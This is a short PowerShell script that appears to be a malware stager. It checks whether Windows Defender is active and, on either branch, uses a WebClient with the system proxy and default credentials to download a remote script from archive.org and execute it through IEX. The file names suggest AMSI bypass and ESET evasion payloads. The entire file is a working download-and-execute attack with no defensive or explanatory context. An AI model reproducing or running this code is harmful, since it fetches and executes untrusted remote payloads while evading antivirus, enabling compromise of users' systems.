
function YaLatifu
{
$yaallah = Get-MpComputerStatus
if($yaallah.AMServiceEnabled -eq "False"){
echo "Fucking Defender"
$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('https://ia601506.us.archive.org/24/items/amsi1/amsi6.txt');
}
else
{
echo "not defender"
$e=new-object net.webclient;
		$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
		$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
		IEX $e.downloadstring('https://ia801403.us.archive.org/12/items/eset1_202102/eset6.txt');
echo "True"

}
}
YaLatifu
